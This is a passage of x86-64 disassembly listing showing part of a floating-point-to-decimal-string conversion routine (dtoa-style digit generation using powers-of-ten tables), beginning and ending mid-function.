   140006ffe:	83 bd b0 00 00 00 09 	cmpl   $0x9,0xb0(%rbp)
   140007005:	7e 0a                	jle    0x140007011
   140007007:	c7 85 b0 00 00 00 00 	movl   $0x0,0xb0(%rbp)
   14000700e:	00 00 00 
   140007011:	c7 45 34 01 00 00 00 	movl   $0x1,0x34(%rbp)
   140007018:	83 bd b0 00 00 00 05 	cmpl   $0x5,0xb0(%rbp)
   14000701f:	7e 10                	jle    0x140007031
   140007021:	83 ad b0 00 00 00 04 	subl   $0x4,0xb0(%rbp)
   140007028:	c7 45 34 00 00 00 00 	movl   $0x0,0x34(%rbp)
   14000702f:	eb 1b                	jmp    0x14000704c
   140007031:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007034:	3d f9 03 00 00       	cmp    $0x3f9,%eax
   140007039:	7f 0a                	jg     0x140007045
   14000703b:	8b 45 b0             	mov    -0x50(%rbp),%eax
   14000703e:	3d 02 fc ff ff       	cmp    $0xfffffc02,%eax
   140007043:	7d 07                	jge    0x14000704c
   140007045:	c7 45 34 00 00 00 00 	movl   $0x0,0x34(%rbp)
   14000704c:	c7 45 50 01 00 00 00 	movl   $0x1,0x50(%rbp)
   140007053:	c7 45 68 ff ff ff ff 	movl   $0xffffffff,0x68(%rbp)
   14000705a:	8b 45 68             	mov    0x68(%rbp),%eax
   14000705d:	89 45 6c             	mov    %eax,0x6c(%rbp)
   140007060:	83 bd b0 00 00 00 05 	cmpl   $0x5,0xb0(%rbp)
   140007067:	0f 84 c5 00 00 00    	je     0x140007132
   14000706d:	83 bd b0 00 00 00 05 	cmpl   $0x5,0xb0(%rbp)
   140007074:	0f 8f e6 00 00 00    	jg     0x140007160
   14000707a:	83 bd b0 00 00 00 04 	cmpl   $0x4,0xb0(%rbp)
   140007081:	74 7e                	je     0x140007101
   140007083:	83 bd b0 00 00 00 04 	cmpl   $0x4,0xb0(%rbp)
   14000708a:	0f 8f d0 00 00 00    	jg     0x140007160
   140007090:	83 bd b0 00 00 00 03 	cmpl   $0x3,0xb0(%rbp)
   140007097:	0f 84 8e 00 00 00    	je     0x14000712b
   14000709d:	83 bd b0 00 00 00 03 	cmpl   $0x3,0xb0(%rbp)
   1400070a4:	0f 8f b6 00 00 00    	jg     0x140007160
   1400070aa:	83 bd b0 00 00 00 01 	cmpl   $0x1,0xb0(%rbp)
   1400070b1:	7f 0e                	jg     0x1400070c1
   1400070b3:	83 bd b0 00 00 00 00 	cmpl   $0x0,0xb0(%rbp)
   1400070ba:	79 13                	jns    0x1400070cf
   1400070bc:	e9 9f 00 00 00       	jmp    0x140007160
   1400070c1:	83 bd b0 00 00 00 02 	cmpl   $0x2,0xb0(%rbp)
   1400070c8:	74 30                	je     0x1400070fa
   1400070ca:	e9 91 00 00 00       	jmp    0x140007160
   1400070cf:	66 0f ef c9          	pxor   %xmm1,%xmm1
   1400070d3:	f2 0f 2a 4d f8       	cvtsi2sdl -0x8(%rbp),%xmm1
   1400070d8:	f2 0f 10 05 48 54 00 	movsd  0x5448(%rip),%xmm0        # 0x14000c528
   1400070df:	00 
   1400070e0:	f2 0f 59 c1          	mulsd  %xmm1,%xmm0
   1400070e4:	f2 0f 2c c0          	cvttsd2si %xmm0,%eax
   1400070e8:	83 c0 03             	add    $0x3,%eax
   1400070eb:	89 45 b0             	mov    %eax,-0x50(%rbp)
   1400070ee:	c7 85 b8 00 00 00 00 	movl   $0x0,0xb8(%rbp)
   1400070f5:	00 00 00 
   1400070f8:	eb 66                	jmp    0x140007160
   1400070fa:	c7 45 50 00 00 00 00 	movl   $0x0,0x50(%rbp)
   140007101:	83 bd b8 00 00 00 00 	cmpl   $0x0,0xb8(%rbp)
   140007108:	7f 0a                	jg     0x140007114
   14000710a:	c7 85 b8 00 00 00 01 	movl   $0x1,0xb8(%rbp)
   140007111:	00 00 00 
   140007114:	8b 85 b8 00 00 00    	mov    0xb8(%rbp),%eax
   14000711a:	89 45 b0             	mov    %eax,-0x50(%rbp)
   14000711d:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007120:	89 45 68             	mov    %eax,0x68(%rbp)
   140007123:	8b 45 68             	mov    0x68(%rbp),%eax
   140007126:	89 45 6c             	mov    %eax,0x6c(%rbp)
   140007129:	eb 35                	jmp    0x140007160
   14000712b:	c7 45 50 00 00 00 00 	movl   $0x0,0x50(%rbp)
   140007132:	8b 95 b8 00 00 00    	mov    0xb8(%rbp),%edx
   140007138:	8b 45 58             	mov    0x58(%rbp),%eax
   14000713b:	01 d0                	add    %edx,%eax
   14000713d:	83 c0 01             	add    $0x1,%eax
   140007140:	89 45 b0             	mov    %eax,-0x50(%rbp)
   140007143:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007146:	89 45 6c             	mov    %eax,0x6c(%rbp)
   140007149:	8b 45 b0             	mov    -0x50(%rbp),%eax
   14000714c:	83 e8 01             	sub    $0x1,%eax
   14000714f:	89 45 68             	mov    %eax,0x68(%rbp)
   140007152:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007155:	85 c0                	test   %eax,%eax
   140007157:	7f 07                	jg     0x140007160
   140007159:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%rbp)
   140007160:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007163:	89 c1                	mov    %eax,%ecx
   140007165:	e8 56 f6 ff ff       	call   0x1400067c0
   14000716a:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000716e:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140007172:	48 89 45 00          	mov    %rax,0x0(%rbp)
   140007176:	83 bd b0 00 00 00 01 	cmpl   $0x1,0xb0(%rbp)
   14000717d:	7f 09                	jg     0x140007188
   14000717f:	c7 45 44 00 00 00 00 	movl   $0x0,0x44(%rbp)
   140007186:	eb 38                	jmp    0x1400071c0
   140007188:	48 8b 85 90 00 00 00 	mov    0x90(%rbp),%rax
   14000718f:	8b 40 0c             	mov    0xc(%rax),%eax
   140007192:	83 e8 01             	sub    $0x1,%eax
   140007195:	89 45 44             	mov    %eax,0x44(%rbp)
   140007198:	83 7d 44 00          	cmpl   $0x0,0x44(%rbp)
   14000719c:	74 22                	je     0x1400071c0
   14000719e:	83 7d 44 00          	cmpl   $0x0,0x44(%rbp)
   1400071a2:	79 07                	jns    0x1400071ab
   1400071a4:	c7 45 44 02 00 00 00 	movl   $0x2,0x44(%rbp)
   1400071ab:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400071ae:	83 e0 08             	and    $0x8,%eax
   1400071b1:	85 c0                	test   %eax,%eax
   1400071b3:	74 0b                	je     0x1400071c0
   1400071b5:	b8 03 00 00 00       	mov    $0x3,%eax
   1400071ba:	2b 45 44             	sub    0x44(%rbp),%eax
   1400071bd:	89 45 44             	mov    %eax,0x44(%rbp)
   1400071c0:	83 7d 6c 00          	cmpl   $0x0,0x6c(%rbp)
   1400071c4:	0f 88 b9 04 00 00    	js     0x140007683
   1400071ca:	83 7d 6c 0e          	cmpl   $0xe,0x6c(%rbp)
   1400071ce:	0f 8f af 04 00 00    	jg     0x140007683
   1400071d4:	83 7d 34 00          	cmpl   $0x0,0x34(%rbp)
   1400071d8:	0f 84 a5 04 00 00    	je     0x140007683
   1400071de:	83 7d 44 00          	cmpl   $0x0,0x44(%rbp)
   1400071e2:	0f 85 9b 04 00 00    	jne    0x140007683
   1400071e8:	83 7d 58 00          	cmpl   $0x0,0x58(%rbp)
   1400071ec:	0f 85 91 04 00 00    	jne    0x140007683
   1400071f2:	c7 45 b0 00 00 00 00 	movl   $0x0,-0x50(%rbp)
   1400071f9:	f2 0f 10 45 a8       	movsd  -0x58(%rbp),%xmm0
   1400071fe:	f2 0f 11 45 e0       	movsd  %xmm0,-0x20(%rbp)
   140007203:	8b 45 58             	mov    0x58(%rbp),%eax
   140007206:	89 45 dc             	mov    %eax,-0x24(%rbp)
   140007209:	8b 45 6c             	mov    0x6c(%rbp),%eax
   14000720c:	89 45 d8             	mov    %eax,-0x28(%rbp)
   14000720f:	c7 45 70 02 00 00 00 	movl   $0x2,0x70(%rbp)
   140007216:	83 7d 58 00          	cmpl   $0x0,0x58(%rbp)
   14000721a:	0f 8e 98 00 00 00    	jle    0x1400072b8
   140007220:	8b 45 58             	mov    0x58(%rbp),%eax
   140007223:	83 e0 0f             	and    $0xf,%eax
   140007226:	89 c2                	mov    %eax,%edx
   140007228:	48 8b 05 c1 55 00 00 	mov    0x55c1(%rip),%rax        # 0x14000c7f0
   14000722f:	48 63 d2             	movslq %edx,%rdx
   140007232:	f2 0f 10 04 d0       	movsd  (%rax,%rdx,8),%xmm0
   140007237:	f2 0f 11 45 08       	movsd  %xmm0,0x8(%rbp)
   14000723c:	8b 45 58             	mov    0x58(%rbp),%eax
   14000723f:	c1 f8 04             	sar    $0x4,%eax
   140007242:	89 45 60             	mov    %eax,0x60(%rbp)
   140007245:	8b 45 60             	mov    0x60(%rbp),%eax
   140007248:	83 e0 10             	and    $0x10,%eax
   14000724b:	85 c0                	test   %eax,%eax
   14000724d:	74 5e                	je     0x1400072ad
   14000724f:	83 65 60 0f          	andl   $0xf,0x60(%rbp)
   140007253:	f2 0f 10 45 a8       	movsd  -0x58(%rbp),%xmm0
   140007258:	48 8b 05 c1 54 00 00 	mov    0x54c1(%rip),%rax        # 0x14000c720
   14000725f:	f2 0f 10 48 20       	movsd  0x20(%rax),%xmm1
   140007264:	f2 0f 5e c1          	divsd  %xmm1,%xmm0
   140007268:	f2 0f 11 45 a8       	movsd  %xmm0,-0x58(%rbp)
   14000726d:	83 45 70 01          	addl   $0x1,0x70(%rbp)
   140007271:	eb 3a                	jmp    0x1400072ad
   140007273:	8b 45 60             	mov    0x60(%rbp),%eax
   140007276:	83 e0 01             	and    $0x1,%eax
   140007279:	85 c0                	test   %eax,%eax
   14000727b:	74 24                	je     0x1400072a1
   14000727d:	83 45 70 01          	addl   $0x1,0x70(%rbp)
   140007281:	8b 55 b0             	mov    -0x50(%rbp),%edx
   140007284:	48 8b 05 95 54 00 00 	mov    0x5495(%rip),%rax        # 0x14000c720
   14000728b:	48 63 d2             	movslq %edx,%rdx
   14000728e:	f2 0f 10 04 d0       	movsd  (%rax,%rdx,8),%xmm0
   140007293:	f2 0f 10 4d 08       	movsd  0x8(%rbp),%xmm1
   140007298:	f2 0f 59 c1          	mulsd  %xmm1,%xmm0
   14000729c:	f2 0f 11 45 08       	movsd  %xmm0,0x8(%rbp)
   1400072a1:	d1 7d 60             	sarl   $1,0x60(%rbp)
   1400072a4:	8b 45 b0             	mov    -0x50(%rbp),%eax
   1400072a7:	83 c0 01             	add    $0x1,%eax
   1400072aa:	89 45 b0             	mov    %eax,-0x50(%rbp)
   1400072ad:	83 7d 60 00          	cmpl   $0x0,0x60(%rbp)
   1400072b1:	75 c0                	jne    0x140007273
   1400072b3:	e9 8b 00 00 00       	jmp    0x140007343
   1400072b8:	f2 0f 10 05 70 52 00 	movsd  0x5270(%rip),%xmm0        # 0x14000c530
   1400072bf:	00 
   1400072c0:	f2 0f 11 45 08       	movsd  %xmm0,0x8(%rbp)
   1400072c5:	8b 45 58             	mov    0x58(%rbp),%eax
   1400072c8:	f7 d8                	neg    %eax
   1400072ca:	89 45 5c             	mov    %eax,0x5c(%rbp)
   1400072cd:	83 7d 5c 00          	cmpl   $0x0,0x5c(%rbp)
   1400072d1:	74 70                	je     0x140007343
   1400072d3:	f2 0f 10 4d a8       	movsd  -0x58(%rbp),%xmm1
   1400072d8:	8b 45 5c             	mov    0x5c(%rbp),%eax
   1400072db:	83 e0 0f             	and    $0xf,%eax
   1400072de:	89 c2                	mov    %eax,%edx
   1400072e0:	48 8b 05 09 55 00 00 	mov    0x5509(%rip),%rax        # 0x14000c7f0
   1400072e7:	48 63 d2             	movslq %edx,%rdx
   1400072ea:	f2 0f 10 04 d0       	movsd  (%rax,%rdx,8),%xmm0
   1400072ef:	f2 0f 59 c1          	mulsd  %xmm1,%xmm0
   1400072f3:	f2 0f 11 45 a8       	movsd  %xmm0,-0x58(%rbp)
   1400072f8:	8b 45 5c             	mov    0x5c(%rbp),%eax
   1400072fb:	c1 f8 04             	sar    $0x4,%eax
   1400072fe:	89 45 60             	mov    %eax,0x60(%rbp)
   140007301:	eb 3a                	jmp    0x14000733d
   140007303:	8b 45 60             	mov    0x60(%rbp),%eax
   140007306:	83 e0 01             	and    $0x1,%eax
   140007309:	85 c0                	test   %eax,%eax
   14000730b:	74 24                	je     0x140007331
   14000730d:	83 45 70 01          	addl   $0x1,0x70(%rbp)
   140007311:	f2 0f 10 4d a8       	movsd  -0x58(%rbp),%xmm1
   140007316:	8b 55 b0             	mov    -0x50(%rbp),%edx
   140007319:	48 8b 05 00 54 00 00 	mov    0x5400(%rip),%rax        # 0x14000c720
   140007320:	48 63 d2             	movslq %edx,%rdx
   140007323:	f2 0f 10 04 d0       	movsd  (%rax,%rdx,8),%xmm0
   140007328:	f2 0f 59 c1          	mulsd  %xmm1,%xmm0
   14000732c:	f2 0f 11 45 a8       	movsd  %xmm0,-0x58(%rbp)
   140007331:	d1 7d 60             	sarl   $1,0x60(%rbp)
   140007334:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007337:	83 c0 01             	add    $0x1,%eax
   14000733a:	89 45 b0             	mov    %eax,-0x50(%rbp)
   14000733d:	83 7d 60 00          	cmpl   $0x0,0x60(%rbp)
   140007341:	75 c0                	jne    0x140007303
   140007343:	83 7d 54 00          	cmpl   $0x0,0x54(%rbp)
   140007347:	74 47                	je     0x140007390
   140007349:	f2 0f 10 4d a8       	movsd  -0x58(%rbp),%xmm1
   14000734e:	f2 0f 10 05 da 51 00 	movsd  0x51da(%rip),%xmm0        # 0x14000c530
   140007355:	00 
   140007356:	66 0f 2f c1          	comisd %xmm1,%xmm0
   14000735a:	76 34                	jbe    0x140007390
   14000735c:	83 7d 6c 00          	cmpl   $0x0,0x6c(%rbp)
   140007360:	7e 2e                	jle    0x140007390
   140007362:	83 7d 68 00          	cmpl   $0x0,0x68(%rbp)
   140007366:	0f 8e f5 02 00 00    	jle    0x140007661
   14000736c:	8b 45 68             	mov    0x68(%rbp),%eax
   14000736f:	89 45 6c             	mov    %eax,0x6c(%rbp)
   140007372:	83 6d 58 01          	subl   $0x1,0x58(%rbp)
   140007376:	f2 0f 10 4d a8       	movsd  -0x58(%rbp),%xmm1
   14000737b:	f2 0f 10 05 b5 51 00 	movsd  0x51b5(%rip),%xmm0        # 0x14000c538
   140007382:	00 
   140007383:	f2 0f 59 c1          	mulsd  %xmm1,%xmm0
   140007387:	f2 0f 11 45 a8       	movsd  %xmm0,-0x58(%rbp)
   14000738c:	83 45 70 01          	addl   $0x1,0x70(%rbp)
   140007390:	66 0f ef c9          	pxor   %xmm1,%xmm1
   140007394:	f2 0f 2a 4d 70       	cvtsi2sdl 0x70(%rbp),%xmm1
   140007399:	f2 0f 10 45 a8       	movsd  -0x58(%rbp),%xmm0
   14000739e:	f2 0f 59 c8          	mulsd  %xmm0,%xmm1
   1400073a2:	f2 0f 10 05 96 51 00 	movsd  0x5196(%rip),%xmm0        # 0x14000c540
   1400073a9:	00 
   1400073aa:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
   1400073ae:	f2 0f 11 45 a0       	movsd  %xmm0,-0x60(%rbp)
   1400073b3:	8b 45 a4             	mov    -0x5c(%rbp),%eax
   1400073b6:	2d 00 00 40 03       	sub    $0x3400000,%eax
   1400073bb:	89 45 a4             	mov    %eax,-0x5c(%rbp)
   1400073be:	83 7d 6c 00          	cmpl   $0x0,0x6c(%rbp)
   1400073c2:	75 5f                	jne    0x140007423
   1400073c4:	48 c7 45 18 00 00 00 	movq   $0x0,0x18(%rbp)
   1400073cb:	00 
   1400073cc:	48 8b 45 18          	mov    0x18(%rbp),%rax
   1400073d0:	48 89 45 10          	mov    %rax,0x10(%rbp)
   1400073d4:	f2 0f 10 45 a8       	movsd  -0x58(%rbp),%xmm0
   1400073d9:	f2 0f 10 0d 67 51 00 	movsd  0x5167(%rip),%xmm1        # 0x14000c548
   1400073e0:	00 
   1400073e1:	f2 0f 5c c1          	subsd  %xmm1,%xmm0
   1400073e5:	f2 0f 11 45 a8       	movsd  %xmm0,-0x58(%rbp)
   1400073ea:	f2 0f 10 45 a8       	movsd  -0x58(%rbp),%xmm0
   1400073ef:	f2 0f 10 4d a0       	movsd  -0x60(%rbp),%xmm1
   1400073f4:	66 0f 2f c1          	comisd %xmm1,%xmm0
   1400073f8:	0f 87 ac 07 00 00    	ja     0x140007baa
   1400073fe:	f2 0f 10 4d a8       	movsd  -0x58(%rbp),%xmm1
   140007403:	f2 0f 10 45 a0       	movsd  -0x60(%rbp),%xmm0
   140007408:	f3 0f 7e 15 40 51 00 	movq   0x5140(%rip),%xmm2        # 0x14000c550
   14000740f:	00 
   140007410:	66 0f 57 c2          	xorpd  %xmm2,%xmm0
   140007414:	66 0f 2f c1          	comisd %xmm1,%xmm0
   140007418:	0f 87 6e 07 00 00    	ja     0x140007b8c
   14000741e:	e9 42 02 00 00       	jmp    0x140007665
   140007423:	83 7d 50 00          	cmpl   $0x0,0x50(%rbp)
   140007427:	0f 84 22 01 00 00    	je     0x14000754f
   14000742d:	f2 0f 10 4d 08       	movsd  0x8(%rbp),%xmm1
   140007432:	f2 0f 10 05 26 51 00 	movsd  0x5126(%rip),%xmm0        # 0x14000c560
   140007439:	00 
   14000743a:	f2 0f 59 c1          	mulsd  %xmm1,%xmm0
   14000743e:	8b 45 6c             	mov    0x6c(%rbp),%eax
   140007441:	8d 50 ff             	lea    -0x1(%rax),%edx
   140007444:	48 8b 05 a5 53 00 00 	mov    0x53a5(%rip),%rax        # 0x14000c7f0
   14000744b:	48 63 d2             	movslq %edx,%rdx
   14000744e:	f2 0f 10 0c d0       	movsd  (%rax,%rdx,8),%xmm1
   140007453:	f2 0f 5e c1          	divsd  %xmm1,%xmm0
   140007457:	f2 0f 10 4d a0       	movsd  -0x60(%rbp),%xmm1
   14000745c:	f2 0f 5c c1          	subsd  %xmm1,%xmm0
   140007460:	f2 0f 11 45 a0       	movsd  %xmm0,-0x60(%rbp)
   140007465:	c7 45 b0 00 00 00 00 	movl   $0x0,-0x50(%rbp)
   14000746c:	f2 0f 10 45 a8       	movsd  -0x58(%rbp),%xmm0
   140007471:	f2 0f 5e 45 08       	divsd  0x8(%rbp),%xmm0
   140007476:	f2 0f 2c c0          	cvttsd2si %xmm0,%eax
   14000747a:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   14000747d:	f2 0f 10 45 a8       	movsd  -0x58(%rbp),%xmm0
   140007482:	66 0f ef c9          	pxor   %xmm1,%xmm1
   140007486:	f2 0f 2a 4d d4       	cvtsi2sdl -0x2c(%rbp),%xmm1
   14000748b:	f2 0f 59 4d 08       	mulsd  0x8(%rbp),%xmm1
   140007490:	f2 0f 5c c1          	subsd  %xmm1,%xmm0
   140007494:	f2 0f 11 45 a8       	movsd  %xmm0,-0x58(%rbp)
   140007499:	8b 45 d4             	mov    -0x2c(%rbp),%eax
   14000749c:	8d 48 30             	lea    0x30(%rax),%ecx
   14000749f:	48 8b 45 00          	mov    0x0(%rbp),%rax
   1400074a3:	48 8d 50 01          	lea    0x1(%rax),%rdx
   1400074a7:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   1400074ab:	89 ca                	mov    %ecx,%edx
   1400074ad:	88 10                	mov    %dl,(%rax)
   1400074af:	f2 0f 10 4d a8       	movsd  -0x58(%rbp),%xmm1
   1400074b4:	f2 0f 10 45 a0       	movsd  -0x60(%rbp),%xmm0
   1400074b9:	66 0f 2f c1          	comisd %xmm1,%xmm0
   1400074bd:	76 29                	jbe    0x1400074e8
   1400074bf:	f2 0f 10 45 a8       	movsd  -0x58(%rbp),%xmm0
   1400074c4:	66 0f ef c9          	pxor   %xmm1,%xmm1
   1400074c8:	66 0f 2e c1          	ucomisd %xmm1,%xmm0
   1400074cc:	7a 0e                	jp     0x1400074dc
   1400074ce:	66 0f ef c9          	pxor   %xmm1,%xmm1
   1400074d2:	66 0f 2e c1          	ucomisd %xmm1,%xmm0
   1400074d6:	0f 84 90 0c 00 00    	je     0x14000816c
   1400074dc:	c7 45 64 10 00 00 00 	movl   $0x10,0x64(%rbp)
   1400074e3:	e9 84 0c 00 00       	jmp    0x14000816c
   1400074e8:	f2 0f 10 55 a8       	movsd  -0x58(%rbp),%xmm2
   1400074ed:	f2 0f 10 45 08       	movsd  0x8(%rbp),%xmm0
   1400074f2:	66 0f 28 c8          	movapd %xmm0,%xmm1
   1400074f6:	f2 0f 5c ca          	subsd  %xmm2,%xmm1
   1400074fa:	f2 0f 10 45 a0       	movsd  -0x60(%rbp),%xmm0
   1400074ff:	66 0f 2f c1          	comisd %xmm1,%xmm0
   140007503:	0f 87 c3 02 00 00    	ja     0x1400077cc
   140007509:	8b 45 b0             	mov    -0x50(%rbp),%eax
   14000750c:	83 c0 01             	add    $0x1,%eax
   14000750f:	89 45 b0             	mov    %eax,-0x50(%rbp)
   140007512:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007515:	39 45 6c             	cmp    %eax,0x6c(%rbp)
   140007518:	0f 8e 46 01 00 00    	jle    0x140007664
   14000751e:	f2 0f 10 4d a0       	movsd  -0x60(%rbp),%xmm1
   140007523:	f2 0f 10 05 0d 50 00 	movsd  0x500d(%rip),%xmm0        # 0x14000c538
   14000752a:	00 
   14000752b:	f2 0f 59 c1          	mulsd  %xmm1,%xmm0
   14000752f:	f2 0f 11 45 a0       	movsd  %xmm0,-0x60(%rbp)
   140007534:	f2 0f 10 4d a8       	movsd  -0x58(%rbp),%xmm1
   140007539:	f2 0f 10 05 f7 4f 00 	movsd  0x4ff7(%rip),%xmm0        # 0x14000c538
   140007540:	00 
   140007541:	f2 0f 59 c1          	mulsd  %xmm1,%xmm0
   140007545:	f2 0f 11 45 a8       	movsd  %xmm0,-0x58(%rbp)
   14000754a:	e9 1d ff ff ff       	jmp    0x14000746c
   14000754f:	f2 0f 10 4d a0       	movsd  -0x60(%rbp),%xmm1
   140007554:	8b 45 6c             	mov    0x6c(%rbp),%eax
   140007557:	8d 50 ff             	lea    -0x1(%rax),%edx
   14000755a:	48 8b 05 8f 52 00 00 	mov    0x528f(%rip),%rax        # 0x14000c7f0
   140007561:	48 63 d2             	movslq %edx,%rdx
   140007564:	f2 0f 10 04 d0       	movsd  (%rax,%rdx,8),%xmm0
   140007569:	f2 0f 59 c1          	mulsd  %xmm1,%xmm0
   14000756d:	f2 0f 11 45 a0       	movsd  %xmm0,-0x60(%rbp)
   140007572:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%rbp)
   140007579:	f2 0f 10 45 a8       	movsd  -0x58(%rbp),%xmm0
   14000757e:	f2 0f 5e 45 08       	divsd  0x8(%rbp),%xmm0
   140007583:	f2 0f 2c c0          	cvttsd2si %xmm0,%eax
   140007587:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   14000758a:	83 7d d4 00          	cmpl   $0x0,-0x2c(%rbp)
   14000758e:	74 1c                	je     0x1400075ac
   140007590:	f2 0f 10 45 a8       	movsd  -0x58(%rbp),%xmm0
   140007595:	66 0f ef c9          	pxor   %xmm1,%xmm1
   140007599:	f2 0f 2a 4d d4       	cvtsi2sdl -0x2c(%rbp),%xmm1
   14000759e:	f2 0f 59 4d 08       	mulsd  0x8(%rbp),%xmm1
   1400075a3:	f2 0f 5c c1          	subsd  %xmm1,%xmm0
   1400075a7:	f2 0f 11 45 a8       	movsd  %xmm0,-0x58(%rbp)
   1400075ac:	8b 45 d4             	mov    -0x2c(%rbp),%eax
   1400075af:	8d 48 30             	lea    0x30(%rax),%ecx
   1400075b2:	48 8b 45 00          	mov    0x0(%rbp),%rax
   1400075b6:	48 8d 50 01          	lea    0x1(%rax),%rdx
   1400075ba:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   1400075be:	89 ca                	mov    %ecx,%edx
   1400075c0:	88 10                	mov    %dl,(%rax)
   1400075c2:	8b 45 b0             	mov    -0x50(%rbp),%eax
   1400075c5:	39 45 6c             	cmp    %eax,0x6c(%rbp)
   1400075c8:	75 73                	jne    0x14000763d
   1400075ca:	f2 0f 10 4d 08       	movsd  0x8(%rbp),%xmm1
   1400075cf:	f2 0f 10 05 89 4f 00 	movsd  0x4f89(%rip),%xmm0        # 0x14000c560
   1400075d6:	00 
   1400075d7:	f2 0f 59 c1          	mulsd  %xmm1,%xmm0
   1400075db:	f2 0f 11 45 08       	movsd  %xmm0,0x8(%rbp)
   1400075e0:	f2 0f 10 45 a8       	movsd  -0x58(%rbp),%xmm0
   1400075e5:	f2 0f 10 4d a0       	movsd  -0x60(%rbp),%xmm1
   1400075ea:	f2 0f 58 4d 08       	addsd  0x8(%rbp),%xmm1
   1400075ef:	66 0f 2f c1          	comisd %xmm1,%xmm0
   1400075f3:	0f 87 d6 01 00 00    	ja     0x1400077cf
   1400075f9:	f2 0f 10 4d a8       	movsd  -0x58(%rbp),%xmm1
   1400075fe:	f2 0f 10 55 a0       	movsd  -0x60(%rbp),%xmm2
   140007603:	f2 0f 10 45 08       	movsd  0x8(%rbp),%xmm0
   140007608:	f2 0f 5c c2          	subsd  %xmm2,%xmm0
   14000760c:	66 0f 2f c1          	comisd %xmm1,%xmm0
   140007610:	77 02                	ja     0x140007614
   140007612:	eb 51                	jmp    0x140007665
   140007614:	f2 0f 10 45 a8       	movsd  -0x58(%rbp),%xmm0
   140007619:	66 0f ef c9          	pxor   %xmm1,%xmm1
   14000761d:	66 0f 2e c1          	ucomisd %xmm1,%xmm0
   140007621:	7a 0e                	jp     0x140007631
   140007623:	66 0f ef c9          	pxor   %xmm1,%xmm1
   140007627:	66 0f 2e c1          	ucomisd %xmm1,%xmm0
   14000762b:	0f 84 3e 0b 00 00    	je     0x14000816f
   140007631:	c7 45 64 10 00 00 00 	movl   $0x10,0x64(%rbp)
   140007638:	e9 32 0b 00 00       	jmp    0x14000816f
   14000763d:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007640:	83 c0 01             	add    $0x1,%eax
   140007643:	89 45 b0             	mov    %eax,-0x50(%rbp)
   140007646:	f2 0f 10 4d a8       	movsd  -0x58(%rbp),%xmm1
   14000764b:	f2 0f 10 05 e5 4e 00 	movsd  0x4ee5(%rip),%xmm0        # 0x14000c538
   140007652:	00 
   140007653:	f2 0f 59 c1          	mulsd  %xmm1,%xmm0
   140007657:	f2 0f 11 45 a8       	movsd  %xmm0,-0x58(%rbp)
   14000765c:	e9 18 ff ff ff       	jmp    0x140007579
   140007661:	90                   	nop
   140007662:	eb 01                	jmp    0x140007665
   140007664:	90                   	nop
   140007665:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140007669:	48 89 45 00          	mov    %rax,0x0(%rbp)
   14000766d:	f2 0f 10 45 e0       	movsd  -0x20(%rbp),%xmm0
   140007672:	f2 0f 11 45 a8       	movsd  %xmm0,-0x58(%rbp)
   140007677:	8b 45 dc             	mov    -0x24(%rbp),%eax
   14000767a:	89 45 58             	mov    %eax,0x58(%rbp)
   14000767d:	8b 45 d8             	mov    -0x28(%rbp),%eax
   140007680:	89 45 6c             	mov    %eax,0x6c(%rbp)
   140007683:	83 bd 98 00 00 00 00 	cmpl   $0x0,0x98(%rbp)
   14000768a:	0f 88 bf 01 00 00    	js     0x14000784f
   140007690:	48 8b 85 90 00 00 00 	mov    0x90(%rbp),%rax
   140007697:	8b 40 14             	mov    0x14(%rax),%eax
   14000769a:	39 45 58             	cmp    %eax,0x58(%rbp)
   14000769d:	0f 8f ac 01 00 00    	jg     0x14000784f
   1400076a3:	48 8b 05 46 51 00 00 	mov    0x5146(%rip),%rax        # 0x14000c7f0
   1400076aa:	8b 55 58             	mov    0x58(%rbp),%edx
   1400076ad:	48 63 d2             	movslq %edx,%rdx
   1400076b0:	f2 0f 10 04 d0       	movsd  (%rax,%rdx,8),%xmm0
   1400076b5:	f2 0f 11 45 08       	movsd  %xmm0,0x8(%rbp)
   1400076ba:	83 bd b8 00 00 00 00 	cmpl   $0x0,0xb8(%rbp)
   1400076c1:	79 45                	jns    0x140007708
   1400076c3:	83 7d 6c 00          	cmpl   $0x0,0x6c(%rbp)
   1400076c7:	7f 3f                	jg     0x140007708
   1400076c9:	48 c7 45 18 00 00 00 	movq   $0x0,0x18(%rbp)
   1400076d0:	00 
   1400076d1:	48 8b 45 18          	mov    0x18(%rbp),%rax
   1400076d5:	48 89 45 10          	mov    %rax,0x10(%rbp)
   1400076d9:	83 7d 6c 00          	cmpl   $0x0,0x6c(%rbp)
   1400076dd:	0f 88 ac 04 00 00    	js     0x140007b8f
   1400076e3:	f2 0f 10 4d a8       	movsd  -0x58(%rbp),%xmm1
   1400076e8:	f2 0f 10 55 08       	movsd  0x8(%rbp),%xmm2
   1400076ed:	f2 0f 10 05 53 4e 00 	movsd  0x4e53(%rip),%xmm0        # 0x14000c548
   1400076f4:	00 
   1400076f5:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   1400076f9:	66 0f 2f c1          	comisd %xmm1,%xmm0
   1400076fd:	0f 83 8c 04 00 00    	jae    0x140007b8f
   140007703:	e9 a6 04 00 00       	jmp    0x140007bae
   140007708:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%rbp)
   14000770f:	f2 0f 10 45 a8       	movsd  -0x58(%rbp),%xmm0
   140007714:	f2 0f 5e 45 08       	divsd  0x8(%rbp),%xmm0
   140007719:	f2 0f 2c c0          	cvttsd2si %xmm0,%eax
   14000771d:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   140007720:	f2 0f 10 45 a8       	movsd  -0x58(%rbp),%xmm0
   140007725:	66 0f ef c9          	pxor   %xmm1,%xmm1
